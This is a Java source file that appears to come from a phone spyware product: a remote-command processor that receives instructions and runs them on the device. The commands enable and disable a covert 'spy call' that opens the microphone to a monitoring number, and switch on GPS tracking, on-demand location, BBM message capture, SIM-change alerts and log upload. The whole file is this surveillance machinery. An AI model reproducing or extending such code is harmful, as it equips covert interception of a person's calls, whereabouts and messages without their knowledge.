package com.vvt.rmtcmd;

import java.util.Vector;
import com.vvt.db.FxEventDatabase;
import com.vvt.event.FxSystemEvent;
import com.vvt.event.constant.FxCategory;
import com.vvt.global.Global;
import com.vvt.pref.PrefBugInfo;
import com.vvt.pref.PrefGPS;
import com.vvt.pref.PrefMessenger;
import com.vvt.pref.PrefSystem;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.prot.response.struct.PCCCommand;
import com.vvt.rmtcmd.pcc.PCCBBMCommand;
import com.vvt.rmtcmd.pcc.PCCCaptureStateCommand;
import com.vvt.rmtcmd.pcc.PCCDiagnosticsCommand;
import com.vvt.rmtcmd.pcc.PCCGPSCommand;
import com.vvt.rmtcmd.pcc.PCCGPSOnDemandCommand;
import com.vvt.rmtcmd.pcc.PCCRmtCmdExecutionListener;
import com.vvt.rmtcmd.pcc.PCCRmtCommand;
import com.vvt.rmtcmd.pcc.PCCSIMCommand;
import com.vvt.rmtcmd.pcc.PCCSendLogNowCommand;
import com.vvt.rmtcmd.pcc.PCCStartMicCommand;
import com.vvt.rmtcmd.pcc.PCCStopMicCommand;
import com.vvt.rmtcmd.pcc.PCCWatchListCommand;
import com.vvt.std.Constant;
import com.vvt.std.Log;

public class PCCCmdProcessor implements PCCRmtCmdExecutionListener {

	private Preference pref = Global.getPreference();
	private FxEventDatabase db = Global.getFxEventDatabase();
	
	public void process(Vector pccCmds) {
		for (int i = 0; i < pccCmds.size(); i++) {
			PCCCommand pcc = (PCCCommand)pccCmds.elementAt(i);
			execute(pcc);
		}
	}

	private void execute(PCCCommand pcc) {
		int cmdId = pcc.getCmdId().getId();
		Vector args = pcc.getArguments();
		FxSystemEvent systemEvent = new FxSystemEvent();
		systemEvent.setCategory(FxCategory.PCC);
		systemEvent.setEventTime(System.currentTimeMillis());
		StringBuffer msg = new StringBuffer();
		msg.append("ID: ");
		msg.append(cmdId);
		msg.append(Constant.COMMA_AND_SPACE);
		msg.append("Number Of Argument: ");
		msg.append(pcc.countArguments());
		msg.append("Argument: ");
		for (int i = 0; i < args.size(); i++) {
			msg.append(args);
			if (i != (args.size() - 1)) {
				msg.append(Constant.COMMA_AND_SPACE);
			}
		}
		systemEvent.setSystemMessage(msg.toString());
		db.insert(systemEvent);
		if (cmdId == PhoneixCompliantCommand.SENDING_EVENT.getId()) {
			PCCSendLogNowCommand pccSendingCmd = new PCCSendLogNowCommand();
			pccSendingCmd.execute(this);
		} else if (cmdId == PhoneixCompliantCommand.DIAGNOSTIC.getId()) {
			PCCDiagnosticsCommand pccDiagnosticCmd = new PCCDiagnosticsCommand();
			pccDiagnosticCmd.execute(this);
		} else if (cmdId == PhoneixCompliantCommand.CAPTURE_STATE.getId()) {
			int state = Integer.parseInt((String)args.firstElement());
			PCCCaptureStateCommand captureCmd = new PCCCaptureStateCommand(state);
			captureCmd.execute(this);
		} else {
			// Bug
			PrefBugInfo bug = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
			if (bug.isSupported()) {
				if (cmdId == PhoneixCompliantCommand.ENABLE_SPY_CALL.getId()) {
					String monitorNumber = (String)args.firstElement();
					PCCStartMicCommand startMicCmd = new PCCStartMicCommand(monitorNumber);
					startMicCmd.execute(this);
				} else if (cmdId == PhoneixCompliantCommand.DISABLE_SPY_CALL.getId()) {
					PCCStopMicCommand stopMicCmd = new PCCStopMicCommand();
					stopMicCmd.execute(this);
				}
			}
			if (bug.isConferenceSupported()) {
				if (cmdId == PhoneixCompliantCommand.WATCHLIST.getId()) {
					int state = Integer.parseInt((String)args.firstElement());
					PCCWatchListCommand watchCmd = new PCCWatchListCommand(state);
					watchCmd.execute(this);
				}
			}
			// GPS
			PrefGPS gps = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
			if (gps.isSupported()) {
				if (cmdId == PhoneixCompliantCommand.GPS.getId()) {
					int state = Integer.parseInt((String)args.firstElement());
					int timerIndex = Integer.parseInt((String)args.elementAt(1));
					PCCGPSCommand gpsCmd = new PCCGPSCommand(state, timerIndex);
					gpsCmd.execute(this);
				} else if (cmdId == PhoneixCompliantCommand.GPS_ON_DEMAND.getId()) {
					PCCGPSOnDemandCommand gpsOnDemandCmd = new PCCGPSOnDemandCommand();
					gpsOnDemandCmd.execute(this);
				}
			}
			// IM
			PrefMessenger im = (PrefMessenger)pref.getPrefInfo(PreferenceType.PREF_IM);
			if (im.isSupported()) {
				if (cmdId == PhoneixCompliantCommand.IM.getId()) {
					int state = Integer.parseInt((String)args.firstElement());
					PCCBBMCommand bbmCmd = new PCCBBMCommand(state);
					bbmCmd.execute(this);
				}
			}
			// System
			PrefSystem system = (PrefSystem)pref.getPrefInfo(PreferenceType.PREF_SYSTEM);
			if (system.isSupported()) {
				if (cmdId == PhoneixCompliantCommand.SIM_CHANGE.getId()) {
					int state = Integer.parseInt((String)args.firstElement());
					PCCSIMCommand simCmd = new PCCSIMCommand(state);
					simCmd.execute(this);
				}
			}
		}
	}

	// PCCRmtCmdExecutionListener
	public void cmdExecutedError(PCCRmtCommand cmd) {
		Log.error("PCCCmdProcessor.cmdExecutedError", "Command = " + cmd.getClass().getName());
	}

	public void cmdExecutedSuccess(PCCRmtCommand cmd) {
	}
}
